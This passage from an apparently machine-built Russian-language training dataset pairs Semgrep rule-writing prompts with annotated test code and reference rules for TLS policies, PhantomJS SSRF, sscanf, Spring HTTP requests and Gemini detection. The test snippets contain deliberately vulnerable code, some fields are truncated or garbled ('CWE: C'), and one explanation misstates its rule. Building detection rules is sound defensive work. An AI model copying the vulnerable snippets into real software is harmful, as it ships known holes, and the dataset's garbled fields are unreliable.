    "instruction": "Напиши Semgrep правило для обнаружения: insecure-load-balancer-tls-version\nОписание уязвимости: Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-load-balancer-tls-version.tf\n# Copyright 2019 Bridgecrew\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# pass\n\nresource \"aws_lb_listener\" \"http_redirect\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"HTTP\"\n  port              = \"80\"\n\n  default_action {\n    type = \"redirect\"\n\n    redirect {\n      port        = \"443\"\n      protocol    = \"HTTPS\"\n      status_code = \"HTTP_301\"\n    }\n  }\n}\n\nresource \"aws_lb_listener\" \"tcp\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"TCP\"\n  port              = \"8080\"\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}\n\nresource \"aws_lb_listener\" \"udp\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"UDP\"\n  port              = \"8080\"\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}\n\nresource \"aws_lb_listener\" \"tcp_udp\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"TCP_UDP\"\n  port              = \"8080\"\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}\n\nresource \"aws_lb_listener\" \"tls_fs_1_2\" {\n  load_balancer_arn = var.aws_lb_arn\n  protocol          = \"TLS\"\n  port              = \"8080\"\n  # ok: insecure-load-balancer-tls-versio  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_lb_listener\" \"https_2016\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ruleid: insecure-load-balancer-tls-version\n  protocol          = \"HTTPS\"\n  port              = \"443\"\n  ssl_policy    \n• resource \"aws_lb_listener\" \"tls_fs_1_1\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ruleid: insecure-load-balancer-tls-version\n  protocol          = \"TLS\"\n  port              = \"8080\"\n  ssl_policy     \n• resource \"aws_alb_listener\" \"tls_fs_1_1\" {\n  load_balancer_arn = var.aws_lb_arn\n  protocol          = \"TLS\"\n  port              = \"8080\"\n  # ruleid: insecure-load-balancer-tls-version\n  ssl_policy    \n\nБезопасные паттерны:  \n• resource \"aws_lb_listener\" \"http_redirect\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"HTTP\"\n  port              = \"80\"\n  default_action {\n\n• resource \"aws_lb_listener\" \"tcp\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"TCP\"\n  port              = \"8080\"\n  default_action {\n    type \n• resource \"aws_lb_listener\" \"udp\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"UDP\"\n  port              = \"8080\"\n  default_action {\n    type \n\nЛегенда аннотаций:\n- // ruleid:insecure-load-balancer-tls-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-load-balancer-tls-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-load-balancer-tls-version\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: ssl_policy = $ANYTHING\n      # See: https://docs.aws.amazon.com/elasticloadbalancing/latest/application/create-https-listener.html#describe-ssl-policies\n      - pattern-not-regex: \"ELBSecurityPolicy-TLS13-1-[23]-[(Res)0-9-]+\"\n      - pattern-not-regex: \"ELBSecurityPolicy-FS-1-2-[(Res)0-9-]+\"\n    - patterns:\n      - pattern: protocol = \"HTTP\"\n      - pattern-not-inside: |\n          resource $ANYTHING $NAME {\n            ...\n            default_action {\n              ...\n              redirect {\n                ...\n                protocol = \"HTTPS\"\n                ...\n              }\n              ...\n            }\n            ...\n          }\n  - pattern-inside: |\n      resource $RESOURCE $X {\n        ...\n      }\n  - metavariable-pattern:\n      metavariable: $RESOURCE\n      patterns:\n      - pattern-either:\n          - pattern: |\n              \"aws_lb_listener\"\n          - pattern: |\n              \"aws_alb_listener\"\n  message: >-\n    Detected an AWS load balancer with an insecure TLS version.\n    TLS versions less than 1.2 are considered insecure because they\n    can be broken. To fix this, set your `ssl_policy` to\n    `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default\n    action to redirect to HTTPS.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    references:\n    - https://www.ietf.org/rfc/rfc5246.txt\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Elastic Load Balancer (ELB), которые используют небезопасные версии TLS. Оно проверяет атрибуты 'protocol' и 'ssl_policy' ресурса, чтобы выявить случаи, когда протокол установлен в 'HTTP', а политика SSL не соответствует рекомендуемым стандартам безопасности. Небезопасными считаются политики SSL, которые поддерживают TLS версии ниже 1.2, такие как 'ELBSecurityPolicy-2016-08' или 'ELBSecurityPolicy-FS-1-1-2019-08'. Правило также исключает ресурсы, у которых по умолчанию настроен редирект на HTTPS.\n\n# Ключевые элементы:\n- ID: insecure-load-balancer-tls-version\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-load-balancer-tls-version",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения phantom-injection\nОписание уязвимости: If unverified user data can reach the `phantom` page methods it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: phantom-injection.js\nconst phantom = require('phantom');\n\n(async function() {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n  await page.on('onResourceRequested', function(requestData) {\n    console.info('Requesting', requestData.url);\n  });\n\n  // ruleid: phantom-injection\n  const status = await page.open(input());\n\n  // ok: phantom-injection\n  const status = await page.open('https://stackoverflow.com/');\n\n  const content = await page.property('content');\n  console.log(content);\n\n  await instance.exit();\n})();\n\n(async function(userInput) {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n  await page.on('onResourceRequested', function(requestData) {\n    console.info('Requesting', requestData.url);\n  });\n\n  // ruleid: phantom-injection\n  const status = await page.property('content', input());\n\n  // ruleid: phantom-injection\n  await page.setContent(userInput);\n\n  // ok: phantom-injection\n  var html = '<html>123</html>'\n  const status = await page.property('content', html);\n\n  const content = await page.property('content');\n  console.log(content);\n\n  await instance.exit();\n})();\n\n(async function(userInput) {\n  const instance = await phantom.create();\n  const page = await instance.createPage();\n  await page.on('onResourceRequested', function(requestData) {\n    console.info('Requesting', requestData.url);\n  });\n\n  // ruleid: phantom-injection\n  const status = await page.openUrl(input(), {}, {});\n\n  // ruleid: phantom-injection\n  await page.evaluateJavaScript(userInput);\n\n  // ok: phantom-injection\n  var url = 'https://stackoverflow.com/'\n  const status = await page.openUrl(url, {}, {});\n\n  const content = await page.property('content');\n  console.log(content);\n\n  await instance.exit();\n})();  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: phantom-injection\nconst status = await page.open(input());\n• // ruleid: phantom-injection\nconst status = await page.property('content', input());\n• // ruleid: phantom-injection\nawait page.setContent(userInput);\n\nБезопасные паттерны:  \n• // ok: phantom-injection\nconst status = await page.open('https://stackoverflow.com/');\n• // ok: phantom-injection\nvar html = '<html>123</html>'\nconst status = await page.property('content', html);\n• // ok: phantom-injection\nvar url = 'https://stackoverflow.com/'\nconst status = await page.openUrl(url, {}, {});\n\nЛегенда аннотаций:\n- // ruleid:phantom-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:phantom-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: phantom-injection\n  message: >-\n    If unverified user data can reach the `phantom` page methods it can result in Server-Side Request\n    Forgery vulnerabilities\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - phantom\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      $PHANTOM = require('phantom');\n      ...\n  - pattern-either:\n    - pattern: $PAGE.open($INPUT,...)\n    - pattern: $PAGE.property(\"content\",$INPUT,...)\n    - pattern: $PAGE.setContent($INPUT,...)\n    - pattern: $PAGE.openUrl($INPUT,...)\n    - pattern: $PAGE.evaluateJavaScript($INPUT,...)\n  - pattern-not: $PAGE.open(\"...\",...)\n  - pattern-not: $PAGE.property(\"content\",\"...\",...)\n  - pattern-not: $PAGE.setContent(\"...\",...)\n  - pattern-not: $PAGE.openUrl(\"...\",...)\n  - pattern-not: $PAGE.evaluateJavaScript(\"...\",...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода страницы (`page`) в библиотеке PhantomJS, где входные данные (`input`) передаются напрямую без проверки. Это может привести к SSRF-уязвимостям, так как не проверенные пользователем данные могут быть переданы методам страницы, вызывая выполнение небезопасных запросов. Правило использует шаблон внутри (`pattern-inside`) для идентификации библиотеки PhantomJS и комбинацию шаблонов (`pattern-either`) для выявления различных методов страницы, принимающих пользовательские данные. Шаблоны отрицания (`pattern-not`) исключают случаи, когда данные явно указаны литералами или безопасными значениями.\n\n# Ключевые элементы:\n- ID: phantom-injection\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "phantom-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: incorrect-use-sscanf-fn\nОписание уязвимости: Avoid 'sscanf()' for number conversions. Its use can lead to undefined behavior, slow processing, and integer overflows. Instead prefer the 'strto*()' family of functions.\nCWE: \nТип анализа: search\nЯзык: c",
    "input": "Требования:\n- Язык: c\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: incorrect-use-sscanf-fn.c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    const char *float_str = \"3.1415926535897932384626433832\";\n    const char *int_str = \"9999999999999999999999999\";\n    int read;\n\n    float f;\n    double d;\n    long double ld;\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%f\", &f);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%lf\", &d);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%llf\", &ld);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(float_str, \"%Lf\", &ld);\n\n    // ok:incorrect-use-sscanf-fn\n    f = strtof(float_str, NULL);\n\n    // ok:incorrect-use-sscanf-fn\n    d = strtod(float_str, NULL);\n\n    // ok:incorrect-use-sscanf-fn\n    ld = strtold(float_str, NULL);\n\n    int i;\n    long int li;\n    long long int lli;\n    unsigned int ui;\n    unsigned long int uli;\n    unsigned long long int ulli;\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%d\", &i);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%ld\", &li);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%lld\", &lli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%Ld\", &lli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%u\", &ui);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%lu\", &uli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%llu\", &ulli);\n\n    // ruleid:incorrect-use-sscanf-fn\n    read = sscanf(int_str, \"%Lu\", &ulli);\n\n    // ok:incorrect-use-sscanf-fn\n    li = strtol(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    lli = strtoll(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    uli = strtoul(int_str, NULL, 0);\n\n    // ok:incorrect-use-sscanf-fn\n    ulli = strtoull(int_str, NULL, 0);\n\n    return 0;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• read = sscanf(float_str, \"%f\", &f);\n• read = sscanf(float_str, \"%lf\", &d);\n• read = sscanf(float_str, \"%llf\", &ld);\n\nБезопасные паттерны:  \n• f = strtof(float_str, NULL);\n• d = strtod(float_str, NULL);\n• ld = strtold(float_str, NULL);\n\nЛегенда аннотаций:\n- // ruleid:incorrect-use-sscanf-fn: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:incorrect-use-sscanf-fn: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: incorrect-use-sscanf-fn\n    patterns:\n      - pattern: sscanf($STR, $FMT, $PTR);\n      - metavariable-regex:\n          metavariable: $FMT\n          regex: '\"%(l{0,2}|L)([fegEa]|[dDiouxX])\"'\n    message: >-\n      Avoid 'sscanf()' for number conversions. Its use can lead to undefined\n      behavior, slow processing, and integer overflows. Instead prefer the\n      'strto*()' family of functions.\n    metadata:\n      references:\n        - https://stackoverflow.com/q/22865622\n        - https://stackoverflow.com/q/7021725\n        - https://www.mattkeeter.com/blog/2021-03-01-happen/\n      category: correctness\n      technology:\n        - c\n    languages: [c]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции sscanf(), которые используются для преобразования чисел. Паттерн ищет конкретные форматы формата, такие как '%(l{0,2}|L)[fegEa]' или '%(l{0,2}|L)[dDiouxX]', которые указывают на преобразование чисел с использованием sscanf(). Эти форматы соответствуют числовым типам, таким как float, double, long double и целые числа различных размеров. Правило рекомендует использовать вместо этого семейство функций strto*, так как они обеспечивают более безопасное и эффективное преобразование чисел.\n\n# Ключевые элементы:\n- ID: incorrect-use-sscanf-fn\n- Язык: c \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "incorrect-use-sscanf-fn",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: spring-http-request\nОписание уязвимости: Checks for requests sent via Java Spring RestTemplate API to http:// URLS. This is dangerous because the server is attempting to connect to a website that does not encrypt traffic with TLS. Instead, send requests only to https:// URLS.\nCWE: C\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: spring-http-request.java\npublic class Bad {\n    public void bad1() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        return restTemplate.delete(\"http://example.com\");\n    }\n\n    public void bad2() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        String url = \"http://example.com\";\n        void hello = restTemplate.delete(url, object);\n    }\n\n    public void bad3() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        URI url = new URI(\"http://example.com\");\n        void hello = restTemplate.delete(url, object);\n    }\n\n    public void bad4() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        return restTemplate.doExecute(\"http://example.com\");\n    }\n\n    public void bad5() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        String url = \"http://example.com\";\n        result = restTemplate.doExecute(url, object);\n    }\n\n    public void bad6() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        URI url = new URI(\"http://example.com\");\n        result = restTemplate.doExecute(url, object);\n    }\n\n    public void bad7() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        String fooResourceUrl\n        = \"http://localhost:8080/spring-rest/foos\";\n        ResponseEntity<String> response\n        = restTemplate.getForEntity(fooResourceUrl, String.class);\n        assertThat(response.getStatusCode(), equalTo(HttpStatus.OK));\n    }\n\n    public void bad8() {\n        // ruleid: spring-http-request\n        RestTemplate restTemplate = new RestTemplate();\n        HttpEntity<Foo> request = new HttpEntity<>(new Foo(\"bar\"));\n        String fooResourceUrl = \"http://example.com\";\n        Foo foo = restTemplate.postF  # Ограничиваем длину\n\nОпасные паттерны:\n• RestTemplate restTemplate = new RestTemplate();\nreturn restTemplate.delete(\"http://example.com\");\n• String url = \"http://example.com\";...void hello = restTemplate.delete(url, object);\n• URI url = new URI(\"http://example.com\");...void hello = restTemplate.delete(url, object);\n\nБезопасные паттерны:  \n• RestTemplate restTemplate = new RestTemplate();\nreturn restTemplate.delete(\"https://example.com\");\n• String url = \"https://example.com\";...void hello = restTemplate.delete(url, object);\n• URI url = new URI(\"https://example.com\");...void hello = restTemplate.delete(url, object);\n\nЛегенда аннотаций:\n- // ruleid:spring-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spring-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spring-http-request\n  message: >-\n    Checks for requests sent via Java Spring RestTemplate API to http:// URLS. This is dangerous because\n    the server is attempting to connect to a website that does not encrypt traffic with TLS. Instead,\n    send requests only to\n    https:// URLS.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/web/client/RestTemplate.html#delete-java.lang.String-java.util.Map-\n    - https://www.baeldung.com/rest-template\n    subcategory:\n    - vuln\n    technology:\n    - spring\n    vulnerability: Insecure Transport\n  languages:\n  - java\n  fix-regex:\n    regex: '[Hh][Tt][Tt][Pp]://'\n    replacement: https://\n    count: 1\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $RESTTEMP = new RestTemplate(...);\n        ...\n        $RESTTEMP.$FUNC(\"=~/[hH][tT][tT][pP]://.*/\", ...);\n    - pattern: |\n        $RESTTEMP = new RestTemplate(...);\n        ...\n        String $URL = \"=~/[hH][tT][tT][pP]://.*/\";\n        ...\n        $RESTTEMP.$FUNC($URL, ...);\n    - pattern: |\n        $RESTTEMP = new RestTemplate(...);\n        ...\n        $URL = new URI(..., \"=~/[hH][tT][tT][pP]://.*/\", ...);\n        ...\n        $RESTTEMP.$FUNC($URL, ...);\n  - metavariable-regex:\n      metavariable: $FUNC\n      regex: (delete|doExecute|exchange|getForEntity|getForObject|headForHeaders|optionsForAllow|patchForObject|postForEntity|postForLocation|postForObject|put)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов методов RestTemplate в Java-коде, которые используют HTTP-протокол вместо HTTPS. Анализируется наличие строк, начинающихся с 'http://' или содержащих регулярное выражение '=~/[hH][tT][tT][pP]://.*/', внутри вызова метода RestTemplate. Паттерны либо напрямую проверяют методы RestTemplate, либо содержат переменную URL, которая может быть передана методам RestTemplate.\n\n# Ключевые элементы:\n- ID: spring-http-request\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "spring-http-request",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: detect-gemini\nОписание уязвимости: Possibly found usage of AI: Gemini\nCWE: \nТип анализа: search\nЯзык: kotlin",
    "input": "Требования:\n- Язык: kotlin\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-gemini.kt\n/*\n * Copyright 2023 Google LLC\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage com.google.ai.sample\n\nimport android.os.Bundle\nimport androidx.activity.ComponentActivity\nimport androidx.activity.compose.setContent\nimport androidx.compose.foundation.layout.fillMaxSize\nimport androidx.compose.material3.MaterialTheme\nimport androidx.compose.material3.Surface\nimport androidx.compose.ui.Modifier\nimport androidx.navigation.compose.NavHost\nimport androidx.navigation.compose.composable\nimport androidx.navigation.compose.rememberNavController\n// ruleid: detect-gemini\nimport com.google.ai.sample.feature.chat.ChatRoute\n// ruleid: detect-gemini\nimport com.google.ai.sample.feature.multimodal.PhotoReasoningRoute\n// ruleid: detect-gemini\nimport com.google.ai.sample.feature.text.SummarizeRoute\n// ruleid: detect-gemini\nimport com.google.ai.sample.ui.theme.GenerativeAISample\n\nclass MainActivity : ComponentActivity() {\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n\n        setContent {\n            GenerativeAISample {\n                // A surface container using the 'background' color from the theme\n                Surface(\n                    modifier = Modifier.fillMaxSize(),\n                    color = MaterialTheme.colorScheme.background\n                ) {\n                    val navController = rememberNavController()\n\n\t\t\t\t\t// ruleid: detect-gemini\n\t\t\t\t\tval generativeModel = GenerativeM  # Ограничиваем длину\n\nОпасные паттерны:\n• import com.google.ai.sample.feature.chat.ChatRoute\nval generativeModel = GenerativeModel(modelName = \"gemini-1.5-flash\", apiKey = BuildConfig.apiKey)\n• import com.google.ai.sample.feature.multimodal.PhotoReasoningRoute\nval generativeModel = GenerativeModel(modelName = \"gemini-3.5-flash\", apiKey = BuildConfig.apiKey)\n• import com.google.ai.sample.feature.text.SummarizeRoute\nval generativeModel = GenerativeModel(modelName = \"gemini-2.0-flash\", apiKey = BuildConfig.apiKey)\n\nБезопасные паттерны:  \n• import com.google.ai.sample.feature.chat.ChatRoute\nval generativeModel = GenerativeModel(modelName = \"other-model-name\", apiKey = BuildConfig.apiKey)\n• import com.google.ai.sample.feature.multimodal.PhotoReasoningRoute\nval generativeModel = GenerativeModel(modelName = \"another-model-name\", apiKey = BuildConfig.apiKey)\n• import com.google.ai.sample.feature.text.SummarizeRoute\nval generativeModel = GenerativeModel(modelName = \"different-model-name\", apiKey = BuildConfig.apiKey)\n\nЛегенда аннотаций:\n- // ruleid:detect-gemini: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-gemini: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-gemini\n    languages:\n      - kotlin\n    severity: INFO\n    message: \"Possibly found usage of AI: Gemini\"\n    pattern-either:\n      - pattern: import com.google.ai\n      - pattern: GenerativeModel(...)\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных упоминаний о использовании искусственного интеллекта (ИИ) под названием Gemini в Kotlin-коде. Анализ выполняется путем поиска импортов пакетов, содержащих слово 'google.ai', а также конструктора класса 'GenerativeModel(...)', который может быть использован для инициализации модели Gemini. Правило использует оператор 'pattern-either', что означает обнаружение либо импорта пакета, либо вызова конструктора класса.\n\n# Ключевые элементы:\n- ID: detect-gemini\n- Язык: kotlin \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-gemini",
      "language": "kotlin",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "missing-deconstructed-value\nОписание уязвимости: Looks like this value is deconstructing a const/var/let you need to use all three `const {...} =` `var {...} =` and `let {...} =` to provide accurate coverage consider adding the missing patterns in a `pattern-inside` for better coverage.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: rule-missing-deconstructed-value.test.yaml\nrules:\n  - id: half-written-crypto-example\n    message: >-\n      A lav crypto hun\n    languages:\n      - js\n    severity: WARNING\n    patterns:\n      - pattern-inside: |\n          # ruleid: missing-deconstructed-value\n          const {...,createCipheriv,...} = require('node:crypto');\n          ...\n      - pattern: |\n          createCipheriv($ALGO, $KEY, $IV);\n      - pattern-either: \n       # ok: missing-deconstructed-value\n        - pattern-inside: |\n            const {...,createCipheriv,...} = require('node:crypto');\n            ...\n        - pattern-inside: |\n            let {...,createCipheriv,...} = require('node:crypto');\n            ...\n        - pattern-inside: |\n            var {...,createCipheriv,...} = require('node:crypto');\n            ...\n      - pattern-either: \n        # ruleid: missing-deconstructed-value\n        - pattern-inside: |\n            const {...,createCipheriv,...} = require('node:crypto');\n            ...\n        # ruleid: missing-deconstructed-value\n        - pattern-inside: |\n            let {...,createCipheriv,...} = require('node:crypto');\n            ...  # Ограничиваем длину\n\nОпасные паттерны:\n• const {...,createCipheriv,...} = require('node:crypto');\n• let {...,createCipheriv,...} = require('node:crypto');\n\nБезопасные паттерны:  \n• const {createCipheriv,...} = require('node:crypto');\n• let {createCipheriv,...} = require('node:crypto');\n• var {createCipheriv,...} = require('node:crypto');\n\nЛегенда аннотаций:\n- // ruleid:missing-deconstructed-value: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-deconstructed-value: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-deconstructed-value\n  message: >-\n    Looks like this value is deconstructing a const/var/let you need to use all three `const {...} =`\n    `var {...} =` and `let {...} =` to provide accurate coverage consider adding the missing patterns\n    in a `pattern-inside` for better coverage.\n  severity: WARNING\n  metadata:\n    category: correctness\n    references:\n    - https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository\n    technology:\n    - semgrep\n  languages:\n  - yaml\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-inside: |\n          rules: ...\n      - pattern-not-inside: |\n          - pattern-either:\n              ...\n      - pattern: |\n          - pattern-inside:\n              $VALUE\n      - pattern-either:\n        - pattern-regex: const {.*}.*=\n        - pattern-regex: let {.*}.*=\n        - pattern-regex: var {.*}.*=\n    - patterns:\n      - patterns:\n        - pattern-inside: |\n            rules: ...\n        - pattern-inside: |\n            - pattern-either:\n                $VALUE\n        - focus-metavariable:\n          - $VALUE\n        - pattern-inside: |\n            - pattern-inside: \n                $A\n        - metavariable-regex:\n            metavariable: $A\n            regex: .*\\s.*(var|const|let)\\s{.*}\\s=\n      - pattern-not:\n          patterns:\n          - pattern-inside: |\n              ...\n              - pattern-inside: \n                  $Z\n              ...\n              - pattern-inside: \n                  $B\n              ...            \n              - pattern-inside: \n                  $C\n              ...\n          - metavariable-regex:\n              metavariable: $Z\n              regex: .*\\s.*(var|const|let).*{.*}\n          - metavariable-regex:\n              metavariable: $B\n              regex: .*\\s.*(var|const|let).*{.*}\n          - metavariable-regex:\n              metavariable: $C\n              regex: .*\\s.*(var|const|let).*{.*}\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев неполной деструктивной распаковки значений констант, переменных или объявлений let. Оно проверяет наличие всех трех форм деструктивной распаковки (`const`, `var` и `let`) при использовании функции require(). Правило использует комбинацию шаблонов pattern-inside и pattern-either для проверки наличия деструктивных присваиваний внутри блоков правил и их отсутствия вне этих блоков. Шаблоны pattern-regex используются для выявления конкретных конструкций деструктивного присваивания.\n\n# Ключевые элементы:\n- ID: missing-deconstructed-value\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-deconstructed-value",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: visualforce-page-api-version\nОписание уязвимости: Visualforce Pages must use API version 55 or higher for required use of the cspHeader attribute set to true.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
